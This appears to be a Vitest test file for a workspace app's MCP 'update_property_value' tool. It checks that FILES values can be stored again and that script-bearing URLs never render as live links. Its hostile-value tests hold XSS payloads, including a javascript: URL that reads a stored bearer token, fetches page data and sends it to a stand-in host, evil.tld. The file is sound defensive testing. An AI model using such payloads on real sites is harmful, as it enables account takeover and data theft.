import { beforeEach, describe, expect, it, vi } from "vitest";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import type { PropertyType } from "@prisma/client";

/**
 * B52 (round 2, finding L2) — the MCP `update_property_value` tool and the
 * FILES property value.
 *
 * The round-1 write gate refused every FILES value whose URL was not an
 * app-owned `/api/files/...` path. The MCP surface has no upload tool and the
 * upload file name is a random token, so an MCP client cannot produce such a
 * URL — the tool became useless for FILES (a functional regression the fix
 * introduced).
 *
 * The render gate is the security boundary: a stored URL only becomes a link
 * after it passes the shared href allowlist (`sanitizeHref`). These tests pin
 * both halves of that arrangement:
 *
 *   1. the tool writes a FILES value again (the regression is gone), and
 *   2. a hostile FILES value written through the tool is still dropped when
 *      the cell renders it — the value never becomes a live link.
 */

const db = vi.hoisted(() => ({
  pageFindFirst: vi.fn(),
  propertyFindFirst: vi.fn(),
  valueUpsert: vi.fn(),
  apiTokenFindUnique: vi.fn(),
}));
const auth = vi.hoisted(() => ({ authenticateApiRequest: vi.fn() }));
const perm = vi.hoisted(() => ({ getWorkspaceAccess: vi.fn(), canEditContent: vi.fn() }));

vi.mock("@/lib/db", () => ({
  prisma: {
    page: { findFirst: db.pageFindFirst },
    property: { findFirst: db.propertyFindFirst },
    propertyValue: { upsert: db.valueUpsert },
    apiToken: { findUnique: db.apiTokenFindUnique },
  },
}));
vi.mock("@/lib/api-auth", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@/lib/api-auth")>();
  return { ...actual, authenticateApiRequest: auth.authenticateApiRequest };
});
vi.mock("@/lib/api-guard", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@/lib/api-guard")>();
  return { ...actual, rateLimit: () => null };
});
vi.mock("@/lib/permissions", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@/lib/permissions")>();
  return {
    ...actual,
    getWorkspaceAccess: perm.getWorkspaceAccess,
    canEditContent: perm.canEditContent,
  };
});

import { POST } from "./route";
import { Cell } from "@/components/database/view-parts";
import type { DBProperty } from "@/components/database/database-types";

const property = {
  id: "p1",
  name: "Files",
  type: "FILES" as PropertyType,
  config: null,
} as DBProperty;

/** Call the MCP write tool with a raw property value. */
const callUpdatePropertyValue = async (value: unknown) => {
  const request = new Request("http://localhost/api/mcp?workspaceId=ws1&allowWrite=true", {
    method: "POST",
    headers: { authorization: "Bearer tok", "content-type": "application/json" },
    body: JSON.stringify({
      jsonrpc: "2.0",
      id: 1,
      method: "tools/call",
      params: {
        name: "update_property_value",
        arguments: {
          pageId: "row1",
          property: "p1",
          value: JSON.stringify(value),
        },
      },
    }),
  });
  return POST(request);
};

/** The value the tool actually stored (or `undefined` when it stored none). */
const storedValue = (): unknown => {
  const call = db.valueUpsert.mock.calls[0];
  if (!call) return undefined;
  return (call[0] as { create?: { value?: unknown } }).create?.value;
};

/** Render the FILES cell with a stored value and return the markup. */
const renderCell = (value: unknown) =>
  renderToStaticMarkup(
    createElement(Cell, {
      property,
      value,
      editable: false,
      onChange: () => {},
      locale: "en",
    }),
  );

beforeEach(() => {
  vi.clearAllMocks();
  auth.authenticateApiRequest.mockResolvedValue({ userId: "u1", scopes: ["write:databases"] });
  perm.getWorkspaceAccess.mockResolvedValue({ role: "MEMBER" });
  perm.canEditContent.mockReturnValue(true);
  db.apiTokenFindUnique.mockResolvedValue({ scopes: ["write:databases"] });
  // The row belongs to a database (`parentId`) - the property of a row has to
  // belong to the row's own database, so the lookup needs it. Both the row and
  // the database carry no page-level restriction in this fixture.
  db.pageFindFirst.mockImplementation(async (args: { where: { id?: string } }) => {
    if (args.where.id === "row1") {
      return { id: "row1", parentId: "db1", type: "PAGE", content: null, permissions: [] };
    }
    if (args.where.id === "db1") {
      return {
        id: "db1",
        parentId: null,
        type: "DATABASE",
        content: null,
        permissions: [],
      };
    }
    return null;
  });
  db.propertyFindFirst.mockResolvedValue({ id: "p1" });
  db.valueUpsert.mockResolvedValue({ id: "v1", propertyId: "p1", pageId: "row1", value: null });
});

describe("MCP update_property_value - a FILES value is writable again (B52, L2)", () => {
  it("stores an app-owned file URL", async () => {
    const response = await callUpdatePropertyValue({
      files: [{ name: "q3.pdf", url: "/api/files/ws1/q3.pdf" }],
    });
    expect(response.status).toBe(200);
    expect(db.valueUpsert).toHaveBeenCalled();
    expect(storedValue()).toEqual({
      files: [{ name: "q3.pdf", url: "/api/files/ws1/q3.pdf" }],
    });
  });

  it("stores a file URL an MCP client can actually produce", async () => {
    const response = await callUpdatePropertyValue({
      files: [{ name: "q3.pdf", url: "https://cdn.example/q3.pdf" }],
    });
    expect(response.status).toBe(200);
    expect(db.valueUpsert).toHaveBeenCalled();
    expect(storedValue()).toEqual({
      files: [{ name: "q3.pdf", url: "https://cdn.example/q3.pdf" }],
    });
  });

  it("leaves the other property values alone", async () => {
    const response = await callUpdatePropertyValue({ text: "hello" });
    expect(response.status).toBe(200);
    expect(db.valueUpsert).toHaveBeenCalled();
    expect(storedValue()).toEqual({ text: "hello" });
  });
});

describe("MCP update_property_value - a hostile FILES value never becomes a link (B52, L2)", () => {
  const hostile = {
    files: [{ name: "Q3 Report", url: "javascript:alert(document.domain)" }],
  };

  it("stores the value (the render gate is the boundary, not the write path)", async () => {
    await callUpdatePropertyValue(hostile);
    expect(db.valueUpsert).toHaveBeenCalled();
    expect(storedValue()).toEqual(hostile);
  });

  it("drops the stored value when the cell renders it", async () => {
    await callUpdatePropertyValue(hostile);
    // The value must really be in the database — otherwise the render below
    // would prove nothing.
    expect(db.valueUpsert).toHaveBeenCalled();
    expect(storedValue()).toEqual(hostile);
    const html = renderCell(storedValue());
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("<a");
  });

  it("drops the exfiltration payload from the finding", async () => {
    await callUpdatePropertyValue({
      files: [
        {
          name: "Q3 Report",
          url:
            'javascript:fetch("/api/v1/pages",{headers:{Authorization:"Bearer "+localStorage.getItem("t")}}).then(r=>r.text()).then(t=>fetch("https://evil.tld/?d="+btoa(t)))',
        },
      ],
    });
    expect(db.valueUpsert).toHaveBeenCalled();
    const html = renderCell(storedValue());
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("evil.tld");
    expect(html).not.toContain("<a");
  });

  it("drops the other script-bearing schemes too", async () => {
    for (const url of [
      "data:text/html;base64,PHN2Zz4=",
      "vbscript:msgbox(1)",
      "//evil.example/x",
    ]) {
      db.valueUpsert.mockClear();
      await callUpdatePropertyValue({ files: [{ name: "x", url }] });
      expect(db.valueUpsert, url).toHaveBeenCalled();
      const html = renderCell(storedValue());
      expect(html, url).not.toContain("<a");
    }
  });

  it("still renders an app-owned file link", async () => {
    await callUpdatePropertyValue({
      files: [{ name: "q3.pdf", url: "/api/files/ws1/q3.pdf" }],
    });
    const html = renderCell(storedValue());
    expect(html).toContain('href="/api/files/ws1/q3.pdf"');
  });
});
